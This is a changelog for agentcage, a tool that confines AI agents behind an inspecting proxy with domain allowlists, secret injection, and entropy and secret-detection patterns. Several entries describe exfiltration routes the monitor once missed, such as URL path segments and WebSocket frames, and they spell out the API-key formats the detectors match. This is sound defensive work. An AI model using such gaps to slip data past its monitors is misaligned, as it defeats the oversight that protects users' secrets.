- `cage audit` primary option renamed from `--lines` to `--max-entries` (consistent with `cage har`)
- Secret and domain commands now show `NAME` instead of `CAGE_NAME` in `--help` output

## [0.8.0] - 2026-03-14

### Added
- **`container.build` config** — `cage create` and `cage update` now automatically rebuild the main container image from a local Containerfile when `container.build.containerfile` is set, with `args` for `--build-arg` pass-through and automatic latest-tag resolution for untagged remote image refs
- Containerfile is copied to the state directory so `cage update` (without `-c`) can rebuild from the stored file

### Changed
- Scaffold container images renamed from `agentcage-{name}` to `agentcage-scaffold-{name}` for clarity
- Update Firecracker binary from v1.14.2 to v1.15.0

## [0.7.1] - 2026-03-06

### Fixed
- `brave_api_key` pattern used wrong prefix (`BSA` instead of `BSAI`), causing false positives on base64 text in POST bodies to `api.anthropic.com`
- `perplexity_key` pattern used hex charset instead of alphanumeric and wrong length (64→48), missing real keys
- `openai_key` pattern now requires `T3BlbkFJ` marker present in all real OpenAI keys
- `anthropic_key` pattern now requires `sk-ant-api03-` or `sk-ant-admin01-` prefix
- `huggingface_token` tightened to alphabetic-only, exact 34 chars
- `github_token` tightened to Base62 (no underscores), exact 36 chars
- `github_pat` tightened to exact structure per GitHub docs
- `aws_access_key` tightened to Base32 charset (`[A-Z2-7]`)
- `firecrawl_key` tightened to hex-only, exact 32 chars
- `telegram_bot_token` widened bot ID range to support older bots
- `discord_bot_token` added `O` prefix, tightened part 1 length

## [0.7.0] - 2026-03-06

### Added
- OpenClaw scaffold now supports nested containers and headless Chrome out of the box
- New `Containerfile` in openclaw scaffold layers podman, Chromium runtime deps, and NSS tools onto the upstream openclaw base image
- `build_image()` accepts `build_args` for passing `--build-arg` to podman builds
- Scaffold build system supports `containerfile` key (alternative to `git`) for local image builds
- Domain allowlist includes container registries (Docker Hub, GHCR), Playwright/Chrome CDNs, and OS package repos
- mitmproxy CA certificate is imported into both the system CA store and Chrome's NSS database at startup
- Secrets inspector with Docker registry JWT auth token exemption

### Changed
- OpenClaw scaffold resources bumped to 8 GB RAM / 4 CPUs with larger tmpfs mounts
- `render_config()` returns `(content, image_tag)` tuple to share resolved tag with build step

## [0.6.4] - 2026-03-04

### Changed
- Update Firecracker binary from v1.14.1 to v1.14.2
- Remove obsolete Node.js/undici check from update-deps script (proxy-fetch patches were removed in 0.6.3)

## [0.6.3] - 2026-03-04

### Fixed
- `cage create` no longer emits a spurious "Failed to restart" warning for the storage volume service when `nested_containers` is not enabled (#21)
- `secret set` no longer leaks the podman secret ID to stdout (#20)
- `cage har` error message now shows the exact config snippet needed to enable capture instead of a vague hint (#19)

### Added
- Commented-out `capture:` config block in all scaffold templates (openclaw, picoclaw, nanoclaw) for discoverability
- Documentation index (`docs/README.md`) with links to all docs and setup guides

### Changed
- Updated tagline to "Don't let your agent phone home."

## [0.6.2] - 2026-03-02

### Fixed
- Fix 502 Bad Gateway on inbound reverse-proxy requests — the transparent-mode host rewrite was overwriting the configured upstream destination with the client's Host header, causing mitmproxy to connect to itself

## [0.6.1] - 2026-03-01

### Fixed
- `cage verify` no longer reports a false egress `[FAIL]` on images without curl or node — adds python3 `urllib` as a third fallback and reports `[WARN]` when no HTTP client is available (#16)

## [0.6.0] - 2026-02-27

### Added
- **TLS passthrough** (`domains.passthrough`) — listed domains bypass mitmproxy TLS interception, allowing protocols that break under MITM (WhatsApp/Noise Protocol, gRPC with cert pinning) to connect directly while still enforcing DNS-level domain filtering
  - Passthrough domains auto-added to DNS allowlist for resolution
  - mitmproxy `ignore_hosts` set via `running()` hook with port-aware regex (`host:port` matching)
  - Hot-reload: passthrough changes picked up via config file mtime check
- `domain add --passthrough` / `domain rm --passthrough` CLI flags for managing passthrough domains
- PicoClaw setup guide

### Changed
- **Domain config redesign** — `domains:` section now uses explicit `allow:` / `block:` / `passthrough:` keys instead of `mode:` + `list:`. The old format is still accepted for backward compatibility
  - `allow:` → allowlist mode (replaces `mode: allowlist` + `list:`)
  - `block:` → blocklist mode (replaces `mode: blocklist` + `list:`)
  - Both `allow` + `block` → validation error
  - All examples, scaffolds, and templates migrated to new format
  - `domain list` shows `[passthrough]` markers
  - `domain add`/`rm` auto-migrates legacy `mode`+`list` configs on write
- Domain inspector accepts both new (`allow`/`block`) and legacy (`mode`/`list`) config keys

## [0.5.0] - 2026-02-27

### Added
- **Transparent HTTP/HTTPS proxy interception** — all outbound port 80/443 traffic from the cage is now intercepted at the network level via iptables REDIRECT rules, regardless of whether the application uses `HTTP_PROXY` env vars. This covers Go, Rust, Node.js `fetch()`, and any other runtime without per-language patching.
  - Default route added to the cage's network namespace via `nsenter` (ExecStartPost)
  - iptables PREROUTING rules redirect ports 80/443 to mitmproxy's transparent listener on port 8443
  - mitmproxy runs with `--mode transparent@8443` alongside the regular forward proxy on port 8080
  - Proxy container gets `NET_ADMIN` capability and `iptables` package
- Port 8443 conflict check — container port 8443 is now rejected (conflicts with transparent proxy)
- `flow.request.pretty_host` normalization in addon.py — transparent mode flows now resolve to the real hostname (from Host header / TLS SNI) instead of the raw destination IP

### Removed
- **Node.js proxy-fetch.mjs patch** — replaced by network-level transparent interception; `NODE_OPTIONS`, `proxy-fetch.mjs`, `package.json`, `package-lock.json`, and `node_modules/undici` are no longer needed
- `_file_sha256()` helper in CLI (only used by removed patch verification)
- `npm ci` step during cage create/update (undici dependency installation)

### Changed
- Proxy container image now installs `iptables` via apt-get (Debian-based mitmproxy image)
- Proxy image build requires additional capabilities (`CAP_SETUID`, `CAP_SETGID`, `CAP_DAC_OVERRIDE`) for apt-get in rootless builds
- Firecracker mode: removed `NODE_OPTIONS` env var from VM startup script (transparent proxy for firecracker is a future task)

## [0.4.1] - 2026-02-26

### Added
- **Generic scaffold metadata** — scaffolds can now declare `build`, `provision`, and `next_steps` in a `scaffold.yaml` file, replacing hardcoded per-scaffold logic in the CLI
  - `build`: auto-clone and build container images (with `cap_add` support) during `agentcage init`
  - `provision`: copy config files from the scaffold directory to the user's home
  - `next_steps`: templated post-init instructions shown to the user
- PicoClaw scaffold now auto-builds the image and provisions `~/.picoclaw/config.json` during init

### Fixed
- `~` in volume host paths (e.g. `~/.picoclaw/config.json:/app/config.json`) was not expanded, causing podman to create a named volume instead of a bind mount
- `podman.build_image()` now accepts `containerfile=None` to auto-detect Dockerfile/Containerfile

## [0.4.0] - 2026-02-26

### Added
- **Nested container support (podman-in-podman)** — `container.nested_containers: true` enables running podman/docker inside a cage, for AI agent frameworks (like NanoClaw) that spawn their own containers
  - Minimal capability elevation (SYS_ADMIN, MKNOD, SETUID, SETGID) instead of `--privileged`
  - Docker CLI shim translates `docker` commands to `podman` inside the cage
  - Inner containers inherit cage network isolation (proxy + DNS filtering still apply)
  - Persistent storage volume for inner podman state
  - Rejects `firecracker` + `nested_containers` combination (not supported)
- `agentcage build nested-base` command — builds `localhost/agentcage-nested` base image with podman, fuse-overlayfs, crun, uidmap, and slirp4netns
- NanoClaw scaffold (`--scaffold nanoclaw`) — pre-configured for AI agent frameworks that spawn Docker containers, with ANTHROPIC_API_KEY injection and Docker registry domains
- Self-contained scaffold directory (`scaffolds/nanoclaw/`) with `build.sh`, `build-agent.sh`, `preload-agent.sh`, Containerfile, and README — decouples NanoClaw from the core CLI
- Scaffold discovery from `scaffolds/*/cage.yaml.j2` in addition to `templates/presets/`
- Nested container verification in `cage verify` — checks inner podman and docker shim availability

### Removed
- `agentcage build nanoclaw` and `agentcage build nanoclaw-agent` CLI subcommands — replaced by scaffold scripts
- Auto-preload of `nanoclaw-agent` during `cage create` / `cage update` — use `preload-agent.sh` instead

## [0.3.19] - 2026-02-26

### Fixed
- OpenClaw scaffold: configure `gateway.controlUi.allowedOrigins` so the gateway starts without errors on newer OpenClaw versions that require explicit origin config for non-loopback binds
- Add LAN access instructions (0.0.0.0 binding) to the scaffold template comments

## [0.3.18] - 2026-02-25

### Fixed
- Reverse proxy forwarded `X-Forwarded-Proto: http` and rewrote `Origin` with `http://` even when the browser connected via HTTPS, causing 502 errors in upstream apps (e.g. OpenClaw WebSocket upgrades and origin validation)

## [0.3.17] - 2026-02-25

### Fixed
- `cage update` no longer fails with "port already in use" when the running cage's own ports are bound
- Port conflict suggestion now suggests port+1 (e.g. 18790) instead of port+10000 (e.g. 28789)
- OpenClaw scaffold: restrict permissions on `.openclaw/` (mode 700) and `openclaw.json` (mode 600) to prevent world-readable config
- Stale `--list-presets` references in install script and README (renamed to `--list-scaffolds` in v0.3.14)

## [0.3.16] - 2026-02-25

### Fixed
- Scaffold templates (`--scaffold openclaw/picoclaw`) rendered port as `None` when `--port` was not specified
- Firecracker rootfs build failed with "permission denied" when `SUDO_USER` differs from `SUDO_UID` user

### Added
- Ports documentation in configuration reference with format table and examples

## [0.3.15] - 2026-02-25

### Added
- Hot-reload proxy config — `domain add/rm` no longer restarts cage services; the proxy detects config file changes via mtime and reloads inspectors in-place

### Changed
- Renamed `cage reload` to `cage restart` (`reload` kept as alias)
- `domain add/rm` prints "Proxy updated." instead of restarting the cage

### Fixed
- Proxy container startup failure under rootless Podman when cert volume was inaccessible due to `/home/mitmproxy` being root-owned mode 700 in the upstream mitmproxy image

## [0.3.14] - 2026-02-25

### Added
- `--port` option on `agentcage init` — set the host port for scaffold templates (e.g. `--scaffold openclaw --port 28789`)
- Port conflict detection in `cage create` and `cage update` — checks host ports with `socket.bind()` before building, with clear error messages and suggested alternatives
- Port format and range (1–65535) validation in config validation

### Changed
- Renamed `--preset` / `--list-presets` CLI flags to `--scaffold` / `--list-scaffolds`
- Renamed "preset" to "scaffold" in all user-facing text, docs, and template comments

### Fixed
- `cage create` no longer fails with a cryptic rootlessport error when a host port is already in use — the conflict is detected early with actionable guidance
- Incomplete cleanup when `cage create` fails after quadlet install
- Build-failure orphan state, `--keep-secrets` flag on `cage destroy`

## [0.3.13] - 2026-02-23

### Added
- `cage backup` command — create a compressed tarball of a cage's config, named volumes, capture logs, and optionally secrets (`--include-secrets`)
- `cage restore` command — restore a cage from a backup tarball, with support for cloning to a different name (`--name`), overwriting (`--force`), and deferred start (`--no-start`)

## [0.3.12] - 2026-02-23

### Added
- `cage exec` command — run commands inside cage containers with alias expansion (`agentcage cage exec <name> -- <command>`)
- `exec_aliases` config field — define shorthand commands expanded by `cage exec` (e.g. `openclaw` → `node openclaw.mjs`)
- `help` config field — inline guidance printed after `cage create` and `cage update`
- `systemd_exec` Jinja filter for proper quoting of `Exec=` arguments containing spaces
- OpenClaw preset: auto-configures `trustedProxies` in `openclaw.json` on first start
- OpenClaw preset: `exec_aliases` and `help` fields for streamlined device pairing workflow

### Fixed
- Reverse-proxy WebSocket frames were blocked by the domain inspector — the proxy now correctly identifies reverse-proxy WebSocket flows and skips domain checks, fixing "domain not in allowlist" errors for inbound WebSocket connections (e.g. OpenClaw Control UI)

## [0.3.11] - 2026-02-23

### Added
- CLI command aliases: `cage ls`/`ps`/`status` → `list`, `cage rm` → `destroy`, `secret ls` → `list`, `domain ls` → `list`
- `agentcage completions <shell>` command for bash/zsh/fish tab completion
- `cage edit` command to open stored config in `$EDITOR`, validate, and reload if running
- `AGENTCAGE_VERSION` env var injected into cage containers

### Changed
- Config file convention renamed from `config.yaml` to `cage.yaml`

## [0.3.10] - 2026-02-21

### Fixed
- Reverse proxy now preserves the browser's original `Host` header (`keep_host_header=true`), eliminating the need to whitelist internal container IPs in OpenClaw
- Reverse proxy now sends `X-Forwarded-For` and `X-Forwarded-Proto` headers so upstream apps (e.g. OpenClaw `gateway.trustedProxies`) can identify real client IPs
- Removed unused `OPENCLAW_GATEWAY_TOKEN` from OpenClaw preset, CLI output, and docs

### Added
- Documentation for reverse proxy trusted proxies configuration and device pairing workflow (`docs/openclaw.md`)

## [0.3.9] - 2026-02-21

### Added
- HAR capture support for full request/response forensics (`capture.enable_har` config option)

### Fixed
- Firecracker socat port-forward retries now scale with `timeout_start_sec` instead of hardcoded 90, preventing premature timeout for large images

## [0.3.8] - 2026-02-21

### Fixed
- Literal secret values sent to authorized `inject_to` domains are no longer blocked — the policy check now recognizes that post-injection requests legitimately contain real values for their target domain (HTTP and WebSocket)
- Proxy image builds now use `--no-cache` to ensure code changes are always picked up on deploy

### Changed
- Audit table direction column shows `INBOUND`/`OUTBOUND` (was `in`/`out`) with header `DIRECTION` (was `DIR`)
- Audit entries include `port`, `path`, `source` (inbound IP), `secrets_injected`, and `secrets_redacted` fields
- Secret inject/redact methods now return lists of secret names acted on, surfaced in audit logs

## [0.3.7] - 2026-02-21

### Added
- `agentcage init` command with `--preset` support for scaffolding config files
- PicoClaw preset (`--preset picoclaw`) — ultra-lightweight Go-based AI assistant with config.json volume mount, minimal resources (256 MB / 0.5 CPU), and domain allowlist for AI providers and messaging channels
- OpenClaw preset (`--preset openclaw`) — moved from static `examples/openclaw/` to Jinja2 template with cage name substitution
- Generic init scaffold for custom setups (`agentcage init <name>` without `--preset`)
- `--list-presets` flag to discover available presets

## [0.3.6] - 2026-02-21

### Fixed
- Install script: `sudo agentcage firecracker setup` fails on Ubuntu because sudo resets PATH — now uses the full binary path
- Install script: PATH warning after install was never shown because the script's own PATH exports made the check always pass
- Install script: removed nonexistent `init` subcommand suggestion, added correct `agentcage init` and `--list-presets` examples

## [0.3.5] - 2026-02-21

### Security
- WebSocket frames now undergo secret injection (outbound) and redaction (inbound), closing a gap where the cage could learn real secret values from WebSocket responses
- Outbound requests and WebSocket frames containing literal secret values are now blocked, preventing exfiltration when the agent learns a real secret value outside the placeholder system

## [0.3.4] - 2026-02-20

### Added
- `cage audit` CLI command — query, filter, and summarize proxy audit logs with support for real-time streaming and JSON output for alerting pipelines

### Changed
- Unified severity levels across `cage logs` and `cage audit` — both now use `--severity` with values `debug`, `info`, `warning`, `error`, `critical`
- Inspector severity values renamed: `medium` → `warning`, `high` → `error` (aligns with standard logging levels)
- Config `logging.level` and per-service overrides now accept `warning` instead of `warn` (and add `critical`)

### Removed
- `cage logs --level` flag (replaced by `--severity`)
- Inspector severity values `low` and `medium` (replaced by `warning`; `high` replaced by `error`)

## [0.3.3] - 2026-02-20

### Fixed
- Secret placeholder policy violations are now flagged instead of blocked — the placeholder is left in place (preventing secret leakage) while the request continues through downstream inspectors

## [0.3.1] - 2026-02-20

### Fixed
- DNS resolution fails on Ubuntu 24.04 and other systemd-resolved hosts — loopback nameservers (127.0.0.53) are now filtered from `/etc/resolv.conf` and real upstream servers are read from `/run/systemd/resolve/resolv.conf` instead (#5)

## [0.3.0] - 2026-02-20

### Security
- Entropy inspector now checks URL path segments for high-entropy data, closing an exfiltration channel that bypassed body inspection
- Rate limiting enabled by default (10 req/s, burst 50) — previously disabled unless explicitly configured
- All secret detection regex patterns now have upper-bounded quantifiers to prevent ReDoS on crafted inputs

## [0.2.0] - 2026-02-20

### Added
- **Firecracker microVM isolation** — run the same three-container topology inside a dedicated microVM with its own Linux kernel, providing hardware-level isolation via KVM (`isolation: firecracker`)
- `firecracker setup` CLI command to download and verify Firecracker binaries and kernel
- Auto-download of Firecracker binary and kernel with SHA-256 checksum verification
- File-based secret store and secrets drive for Firecracker VMs
- Persistent data drive for Firecracker VMs (survives cage updates)
- Graceful VM shutdown via SendCtrlAltDel with trap-based container cleanup
- VM restart support with automatic Podman storage reset
- **Inbound port inspection** — ports exposed via `ports:` config are now routed through the mitmproxy inspector chain in both container and Firecracker modes
- Socat-based port forwarding for Firecracker VMs (replaces iptables DNAT)
- Dependency update script and bumped pinned dependencies

### Changed
- Extracted `Backend` protocol; CLI now dispatches to `ContainerBackend` or `FirecrackerBackend` based on `isolation` config
- Firecracker commands require `sudo` directly (removed `agentcage-nethelper` setuid binary)
- Reverse proxy binds to `0.0.0.0` and skips domain inspector for inbound flows

### Fixed
- Secrets and startup failures in Firecracker VMs
- Firecracker networking: dual-homed TAP, INPUT firewall rules for VM-to-host connectivity
- Firecracker image loading, gzip handling, UID mapping, and port forwarding
- E2E tests use real user's HOME when running via sudo

### Docs
- Firecracker MicroVM isolation guide (`docs/firecracker.md`)
- Updated architecture, security, and README to cover both isolation modes and threat model differences

## [0.1.2] - 2026-02-17

### Fixed
- Cage DNS resolution: bind-mount resolv.conf pointing to dnsmasq instead of relying on `DNS=` directive (which was overridden by aardvark-dns) and `ExecStartPost` (which failed on read-only containers)
- SSRF guard compatibility: dnsmasq returns placeholder IP (198.51.100.1, RFC 5737 TEST-NET-2) for non-allowlisted domains instead of NXDOMAIN, so DNS-pinned SSRF guards no longer crash

### Changed
- Proxy container resolves DNS via upstream servers directly instead of through dnsmasq
- Cage `HTTP_PROXY` uses proxy static IP (10.89.0.11) instead of container name
- `dns_servers` defaults to host DNS servers (from `/etc/resolv.conf`) when omitted from config

### Removed
- `dns.lookup` / `dns/promises.lookup` patches from proxy-fetch.mjs (no longer needed since DNS always resolves)

## [0.1.0] - 2026-02-17

### Added

- CLI with `cage create`, `cage update`, `cage destroy`, `cage list`, `cage verify`, `cage reload`, and `cage logs` commands
- Secret management with `secret set`, `secret list`, and `secret rm` commands
- Domain management with `domain add`, `domain list`, and `domain rm` commands
- Network isolation via rootless Podman with `--internal` network (no internet gateway for the agent)
- Domain allowlist/blocklist filtering at both proxy and DNS layers
- Secret injection — the cage never sees real secrets; the proxy swaps placeholders transparently
- 19 built-in secret detection patterns (OpenAI, Anthropic, AWS, GitHub, Google, Slack, Stripe, and more)
- Built-in `allow_to_domains` mappings so standard secrets reach their provider domains without configuration
- Shannon entropy analysis for detecting encrypted/compressed exfiltration payloads
- Content-type mismatch and base64 blob detection
- Per-host token-bucket rate limiting
- WebSocket frame inspection (secrets, entropy)
- Custom inspector support via Python files
- Structured JSON audit logging
- Container hardening defaults (read-only root, dropped capabilities, no-new-privileges)
- Node.js `fetch()` proxy patch via `--import` loader
- Supply chain hardening (pinned image digests, lockfile integrity, patch file SHA-256 verification)
- systemd quadlet generation with proper dependency ordering
- OpenClaw example configuration and setup guide

[0.8.1]: https://github.com/agentcage/agentcage/releases/tag/v0.8.1
[0.8.0]: https://github.com/agentcage/agentcage/releases/tag/v0.8.0
[0.7.1]: https://github.com/agentcage/agentcage/releases/tag/v0.7.1
[0.7.0]: https://github.com/agentcage/agentcage/releases/tag/v0.7.0
[0.6.4]: https://github.com/agentcage/agentcage/releases/tag/v0.6.4
[0.6.3]: https://github.com/agentcage/agentcage/releases/tag/v0.6.3
[0.6.2]: https://github.com/agentcage/agentcage/releases/tag/v0.6.2
[0.6.1]: https://github.com/agentcage/agentcage/releases/tag/v0.6.1
[0.6.0]: https://github.com/agentcage/agentcage/releases/tag/v0.6.0
[0.5.0]: https://github.com/agentcage/agentcage/releases/tag/v0.5.0
[0.4.1]: https://github.com/agentcage/agentcage/releases/tag/v0.4.1
[0.4.0]: https://github.com/agentcage/agentcage/releases/tag/v0.4.0
[0.3.19]: https://github.com/agentcage/agentcage/releases/tag/v0.3.19
[0.3.18]: https://github.com/agentcage/agentcage/releases/tag/v0.3.18
[0.3.17]: https://github.com/agentcage/agentcage/releases/tag/v0.3.17
[0.3.16]: https://github.com/agentcage/agentcage/releases/tag/v0.3.16
[0.3.15]: https://github.com/agentcage/agentcage/releases/tag/v0.3.15
[0.3.14]: https://github.com/agentcage/agentcage/releases/tag/v0.3.14
[0.3.13]: https://github.com/agentcage/agentcage/releases/tag/v0.3.13
[0.3.12]: https://github.com/agentcage/agentcage/releases/tag/v0.3.12
[0.3.11]: https://github.com/agentcage/agentcage/releases/tag/v0.3.11
[0.3.10]: https://github.com/agentcage/agentcage/releases/tag/v0.3.10
[0.3.9]: https://github.com/agentcage/agentcage/releases/tag/v0.3.9
[0.3.8]: https://github.com/agentcage/agentcage/releases/tag/v0.3.8
[0.3.7]: https://github.com/agentcage/agentcage/releases/tag/v0.3.7
[0.3.6]: https://github.com/agentcage/agentcage/releases/tag/v0.3.6
[0.3.5]: https://github.com/agentcage/agentcage/releases/tag/v0.3.5
[0.3.4]: https://github.com/agentcage/agentcage/releases/tag/v0.3.4
[0.3.3]: https://github.com/agentcage/agentcage/releases/tag/v0.3.3
[0.3.1]: https://github.com/agentcage/agentcage/releases/tag/v0.3.1
[0.3.0]: https://github.com/agentcage/agentcage/releases/tag/v0.3.0
[0.2.0]: https://github.com/agentcage/agentcage/releases/tag/v0.2.0
[0.1.2]: https://github.com/agentcage/agentcage/releases/tag/v0.1.2
[0.1.0]: https://github.com/agentcage/agentcage/releases/tag/v0.1.0
